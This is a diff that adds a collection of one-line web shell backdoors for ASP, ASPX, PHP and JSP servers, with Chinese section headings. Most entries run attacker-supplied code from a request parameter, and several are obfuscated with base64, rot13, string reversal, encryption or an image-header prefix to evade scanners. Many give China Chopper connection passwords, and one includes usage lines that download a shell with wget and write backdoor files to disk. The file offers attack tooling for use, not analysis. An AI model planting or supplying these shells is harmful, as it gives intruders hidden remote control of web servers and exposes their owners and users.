@@ -1,0 +1,244 @@
+======================================================
+||                     ASP一句话                    ||
+======================================================
+----------------------------------------
+<%
+<!-- caidao setting input:<O>sb=eval(request(0))</O>,connecting pass:0 -->
+re= request("sb")
+if re <>"" then
+execute re
+response.end
+end if
+%>
+----------------------------------------
+<%Eval(Request(chr(112))):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
+----------------------------------------
+<%   
+codeds="Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li"  
+execute (decode (codeds) )   
+Function DeCode (Coded)   
+    On Error Resume Next  
+    For i = 1 To Len (Coded)   
+        Curchar = Mid (Coded, i, 1)   
+        If Asc (Curchar) = 16 then   
+            Curchar = chr (8)   
+Elseif Asc (Curchar) = 24 then   
+            Curchar = chr (12)   
+Elseif Asc (Curchar) = 32 then   
+            Curchar = chr (18)   
+        Else    
+            Curchar = chr (Asc (Curchar) -3)   
+        End if   
+        DeCode = Decode&Curchar   
+    Next  
+End Function  
+'response.write(decode(codeds)) 
+' 菜刀连接 /hkmjj.asp?xx=x ,密码 hkmjj
+%>
+----------------------------------------
+<% 
+dim x1,x2 
+x1 = request("pass") 
+x2 = x1 
+eval x2 
+%>
+----------------------------------------
+<% 
+Function MorfiCoder(Code) 
+  MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf) 
+End Function 
+Execute MorfiCoder(")/*/z/*/(tseuqer lave") 
+%>
+Password: z
+----------------------------------------
+<%a=request("cmd")%><%eval a%>
+----------------------------------------
+<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("a"))%>
+----------------------------------------
+<%execute(request("xiaoma"))%>
+----------------------------------------
+1":eval request("a")'
+----------------------------------------
+"%><%eval request("a")%><%'" 
+----------------------------------------
+<%Y=request("x")%> <%execute(Y)%>
+----------------------------------------
+<%eval request("xiaoma")%>
+----------------------------------------
+┼癥污爠煥敵瑳∨≡┩愾  password: a
+----------------------------------------
+======================================================
+||                     ASPX一句话                   ||
+======================================================
+----------------------------------------
+<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>
+----------------------------------------
+<% @Page Language="Jscript"%><%eval(Request.Item["hucxsz"],"unsafe");%>
+----------------------------------------
+<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>
+----------------------------------------
+<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+----------------------------------------
+<script type="text/javascript" language="C#">// <![CDATA[
+ WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10"); // ]]></script>
+Password: webadmin
+----------------------------------------
+<script runat="server" language="JScript"> 
+   function popup(str) { 
+  var q = "u"; 
+  var w = "afe"; 
+  var a = q + "ns" + w; 
+  var b= eval(str,a); 
+  return(b); 
+   } 
+</script>
+----------------------------------------
+<% 
+popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0=")))); 
+%>
+Password: z
+----------------------------------------
+<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["xiaoma"],"unsafe"));%>
+----------------------------------------
+<%@ Page Language="C#" ValidateRequest="false" %>
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["f4ck"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+======================================================
+||                     PHP一句话                    ||
+======================================================
+----------------------------------------
+?JFIF 
+<?php @eval($_POST['caidao']);?>
+----------------------------------------
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+----------------------------------------
+<?php @preg_replace("//e",$_POST[x],"e");exit("|LO|"); ?>
+----------------------------------------
+<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
+----------------------------------------
+<?php $item['wind'] = 'assert';$array[] = $item;$array[0]['wind']($_POST['whirlwind']);?>
+----------------------------------------
+<?php if(isset($_POST["f4ck"])){$a=strrev("edoced_46esab");eval($a($_POST[z0]));}?>
+----------------------------------------
+<?php if(md5($_GET['pass'])=='21232f297a57a5a743894a0e4a801fc3'){eval($_POST[console]);}else{die('fuck off!');}?>
+----------------------------------------
+<?php
+//Password: $ws->Run
+eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
+?>
+----------------------------------------
+<?php
+	$fatezero	= "SABERBERSERKER(\$LANCERPCASTEROSTCASTERARCHERCASTER'faCASTERtASSASSINzCASTERASSASSINCASTERro'RIDER)GINTAMA";
+	$fatestaynight	= str_replace("CASTER", "", $fatezero);
+	$fatezero	= str_replace("LANCER", "_", $fatestaynight);
+	$fatestaynight	= str_replace("SABER", "ev", $fatezero);
+	$fatezero	= str_replace("BERSERKER", "al", $fatestaynight);
+	$fatestaynight	= str_replace("RIDER", "]", $fatezero);
+	$fatezero	= str_replace("GINTAMA", ";", $fatestaynight);
+	$fatestaynight	= str_replace("ARCHER", "[", $fatezero);
+	$fatezero	= str_replace("ASSASSIN", "e", $fatestaynight);
+
+	if($fatestaynight !== $fatezero)
+	{
+		eval($fatezero);//fatezero
+	}
+?> 
+----------------------------------------
+<?php
+//http://test.com/get_write.php?a=/shell.php&b=3C3F70687020406576616C28245F504F53545B2763616964616F275D293B3F3E
+//caidao connecting http://test.com/shell.php	pass:caidao
+$p=realpath(dirname(__FILE__)."/").$_GET["a"];
+$t=$_GET["b"];
+$tt="";
+for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2));
+@fwrite(fopen($p,"w"),$tt);
+echo "success!";
+var_dump($p,$tt);
+?>
+----------------------------------------
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['k8']);?>
+----------------------------------------
+<?php $mujj = $_POST['z'];if ($mujj!=""){$xsser=base64_decode($_POST['z0']);@eval("\$safedg = $xsser;");}?>
+----------------------------------------
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+----------------------------------------
+<?php preg_replace("/^/e",base64_decode($_REQUEST[g]),0);?>
+----------------------------------------
+<?php fputs(fopen("./shell.php","w"),"<?eval(\$_POST[a]);?>")?>
+----------------------------------------
+<?php if($_POST[admin]){assert($_POST[admin]);}else{phpinfo();}?>
+----------------------------------------
+<?php ($www= $_POST['ice']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)','add');?>
+----------------------------------------
+<?php ($_=@$_GET[2]).@$_($_POST[1])?>
+caidao: http://site/1.php?2=assert Password: 1
+----------------------------------------
+<?php
+$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");
+?>
+----------------------------------------
+<?php
+$user="63a9f0ea7bb98050796b649e85481845"; #root
+$pass="7b24afc8bc80e548d66c4e7ff72171c5"; #toor
+
+if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)
+{eval($_GET['idc']);}
+?>
+---------------------------------------
+<?php
+    $func = new ReflectionFunction($_GET[m]);
+    echo $func->invokeArgs(array($_GET[c],$_GET[id]));
+?>
+shell.php?m=file_put_contents&c=test.php&id=<?@eval($_POST[c]);?> //写入一句话马 for linux
+shell.php?m=file_put_contents&c=test.php&id=<?php eval($_POST[c]);?> //写入一句话马 for windows
+shell.php?m=system&c=echo ^<?php eval^($_POST[c]^);?^> >test.php //在当前目录下面生成一句话马 for windows
+shell.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test.php //当前目录下载一句话马 for linux
+----------------------------------------
+<?php assert($_POST[sb]);?>
+----------------------------------------
+<script language="php">@eval($_POST[sb])</script>
+caidao: <O>h=@eval($_POST1);</O>  Password: sb
+----------------------------------------
+<?php eval($_POST[xiaoma]);?>
+----------------------------------------
+<?php $_GET['ts7']($_POST['cmd']);?>
+//caidao: http://www.target.com/shell.php?ts7=assert
+----------------------------------------
+<?php
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // Password: -7
+?>
+----------------------------------------
+<?fputs(fopen("test.php","w"),'<?php eval($_POST["cmd"]);?>');?>
+----------------------------------------
+<?php
+error_reporting(0);
+set_time_limit(0);
+function decrypt($ciphertext_hex,$key){
+$key=md5($key);
+$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+$ciphertext_dec = pack("H*",$ciphertext_hex);
+$iv_dec = substr($ciphertext_dec, 0, $iv_size);
+$ciphertext_dec = substr($ciphertext_dec, $iv_size);
+$plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);
+return trim($plaintext_dec);
+}
+if(@$_REQUEST['key']){
+$key=$_REQUEST['key'];
+$hash='bd40dd58f44adc5c334e53418ea1bcd591521d60662c6753b89dc46bb02b1ecb02bf857eaa0ea5d5a36ecf638d65c55eb9a8f2b17ceb2d740e3eba7792d3995b7d4fdbdf9f5f90b219cf955539b169a40109ff496262cbc21050e6993d1f9a6a678990e0b01a03617dd4b38358d78e9a67eabe8b288487a96ca55a94e8d6614a';
+$shellcode='12ec445a8c4be78007d08367455c60d571c3509ba62d1f2b321fa824667345ff3131b02b81c8ad646ffc3360e60d19d3f7f43b7b21f5bca05d6e7abfc2461b5d72fffb22659aa08655cdd8734baa0fd47b93a5659348954f853d3a68022fb3422a3832efa04792c1a81680e5aa8081716f169e05afb332a26fbd0f76ae8905b9a068ddb54f3ae107ba673362835951f4953db1079b6a3c0b4eb20ca96a241936244947ee67e0d563d8b2eee439cc5ba21151ae520eec0a663f092f9845918c7d6630764dad77808e376e099008403b01c491399da5cb3c8926c29b1bf89e8c751fb33a850c608b20e4c41cf28ec8b8060a30a827b43cd301d9c587863ce39f2326345a0217110fc898acb6c3343f3ce8';
+eval(decrypt($hash,$key));
+}else{
+echo 'ERROR!';
+}
+//caidao:  <0>key=90sec</0>  or  Url: http://www.target.com/90sec.php?key=90sec   Password: shell
+----------------------------------------
+======================================================
+||                     JSP一句话                    ||
+======================================================
+----------------------------------------
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+----------------------------------------
